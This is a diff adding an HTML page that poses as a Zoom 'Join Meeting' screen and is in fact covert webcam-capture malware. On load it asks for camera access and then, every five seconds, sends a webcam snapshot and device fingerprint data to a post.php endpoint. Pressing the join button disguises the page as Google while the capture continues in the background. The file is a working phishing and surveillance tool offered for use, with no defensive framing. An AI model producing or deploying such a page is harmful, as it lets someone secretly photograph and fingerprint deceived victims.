@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Meeting | Zoom</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #242424;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .meeting-card {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            width: 400px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            color: #2d8cff;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            margin: 0 0 10px;
+        }
+
+        p {
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+
+        .preview-box {
+            background: #000;
+            height: 250px;
+            width: 100%;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-join {
+            background-color: #0e71eb;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .btn-join:hover {
+            background-color: #0b5ed7;
+        }
+
+        .hidden-canvas {
+            display: none;
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+</head>
+
+<body onload="init()">
+
+    <div class="meeting-card">
+        <div class="logo">Zoom</div>
+        <h2>Meeting in Progress</h2>
+        <p>The host has let you in. Please check your audio and video settings.</p>
+
+        <div class="preview-box">
+            <video id="video" playsinline autoplay style="width: 100%; height: 100%; object-fit: cover;"></video>
+            <div id="loading-text" style="position: absolute; color: #666;">Waiting for camera...</div>
+        </div>
+
+        <button class="btn-join" onclick="joinMeeting()">Join Audio</button>
+    </div>
+
+    <canvas id="canvas" width="640" height="640" class="hidden-canvas"></canvas>
+
+    <script>
+        function post(imgdata, info) {
+            $.ajax({
+                type: 'POST',
+                data: {
+                    cat: imgdata,
+                    info: JSON.stringify(info)
+                },
+                url: 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) { },
+                error: function () { }
+            });
+        };
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+                document.getElementById('loading-text').style.display = 'none';
+            } catch (e) {
+                console.log("Camera access denied or pending");
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+            var context = canvas.getContext('2d');
+
+            // Capture immediately and then every 5 seconds
+            setInterval(function () {
+                context.drawImage(video, 0, 0, 640, 640);
+                var canvasData = canvas.toDataURL("image/png");
+
+                // Collect Device Info
+                var deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: window.screen.width + "x" + window.screen.height,
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory || "Unknown"
+                };
+
+                post(canvasData, deviceInfo);
+            }, 5000);
+        }
+
+        function joinMeeting() {
+            // Retry init if it failed initially
+            init();
+            alert("Connecting to audio...");
+
+            // Simulate "Meeting Ended" or "Background Mode" by morphing to Google
+            setTimeout(function () {
+                morphToGoogle();
+            }, 2000);
+        }
+
+        function morphToGoogle() {
+            // Clear the Zoom UI
+            document.querySelector('.meeting-card').style.display = 'none';
+            document.body.style.background = '#ffffff';
+            document.body.style.color = '#000000';
+            document.body.style.justifyContent = 'flex-start';
+            document.body.style.alignItems = 'center';
+            document.body.style.paddingTop = '100px';
+            document.title = 'Google';
+
+            // Inject Fake Google UI
+            var googleHTML = `
+                <div style="text-align:center">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="272" height="92">
+                    <br><br>
+                    <input type="text" style="width:500px; padding:10px; border:1px solid #dfe1e5; border-radius:24px; outline:none;" placeholder="Search Google or type a URL">
+                    <br><br>
+                    <button style="background:#f8f9fa; border:1px solid #f8f9fa; padding:10px 20px; margin:5px; border-radius:4px; color:#3c4043; cursor:pointer;">Google Search</button>
+                    <button style="background:#f8f9fa; border:1px solid #f8f9fa; padding:10px 20px; margin:5px; border-radius:4px; color:#3c4043; cursor:pointer;">I'm Feeling Lucky</button>
+                </div>
+            `;
+
+            var div = document.createElement('div');
+            div.innerHTML = googleHTML;
+            document.body.appendChild(div);
+
+            // The camera loop (setInterval) continues running because we didn't reload the page
+            console.log("Background mode active");
+        }
+    </script>
+</body>
+
+</html>
